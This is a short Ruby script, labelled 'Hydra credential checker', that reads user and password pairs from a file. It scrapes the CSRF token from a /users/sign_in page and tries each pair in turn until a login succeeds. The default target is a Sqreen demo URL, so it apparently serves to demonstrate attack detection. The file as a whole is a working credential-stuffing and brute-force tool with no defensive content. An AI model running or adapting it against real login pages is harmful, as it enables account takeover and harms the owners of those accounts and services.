#!/usr/bin/env ruby

require 'net/http'
require 'uri'

begin
require 'colorize'
rescue LoadError
  $stderr.puts "Cannot load library `colorize`, please run:"
  $stderr.puts "    $ gem install colorize"
  $stderr.puts "or"
  $stderr.puts "    $ sudo gem install colorize"
  exit 1
end

def get_form_result(host, user, password)

    http = Net::HTTP.new(host, 80)

    path = "/users/sign_in"
    req = Net::HTTP::Get.new path
    res = http.request(req)
    pat = "authenticity_token\" value=\""
    body = res.body
    token_idx = body.index(pat)
    body[token_idx..-1] =~ /value="([^"]+)"/
    token = $1
    cookie = res['set-cookie']

    path = '/users/sign_in'
    form_data = {
      'user[email]' => user,
      'user[password]' => password,
      'authenticity_token' => token,
    }

    req = Net::HTTP::Post.new(path)
    req['cookie'] = cookie
    req.set_form_data(form_data)
    res = http.request(req)
    return res.code, res.body
end

def is_login_valid(host, user, password)

  code, body = get_form_result(host, user, password)

  if body.include?("Invalid email or password")
    return {status: 403}
  else
    return {status: 200}
  end
  return {status: 500}
end


if ARGV.size > 2 then
  $stderr.puts "Usage: #{$0} [bruteforce_file [url]]"
  $stderr.puts ""
  $stderr.puts "URL defaults to https://disrupt.sqreen.io/"
  exit(-1) 
end

default_bf = File.join(File.dirname($0), '..', 'bflist.txt')

file = ARGV[0] || default_bf
to = ARGV[1] || 'https://disrupt.sqreen.io/'

if URI.parse(to)
  uri = URI.parse(to)
  unless uri.kind_of?(URI::HTTP) or uri.kind_of?(URI::HTTPS)
    $stderr.puts "not an url: #{to}"
    exit(-1)
  end
end

if not File.exist?(file) then
  $stderr.puts "not a file: #{file}"
  exit(-1)
end

puts
puts "Hydra credential checker".colorize(:color => :white, :background => :red)
puts
puts to
puts

for line in File.readlines(file) do
  next if line.strip.empty?
  user, password = line.strip.split(/ +/)
  $stdout.write "trying #{user}:#{password}... "
  $stdout.flush
  
  res = is_login_valid(uri.host, user, password)

  case res[:status]
  when 200
    $stdout.puts("OK!".green)
    break
  when 403
    $stdout.puts("failure".colorize(:blue))
  when 500
    $stdout.puts("server error".red)
    break
  end

end
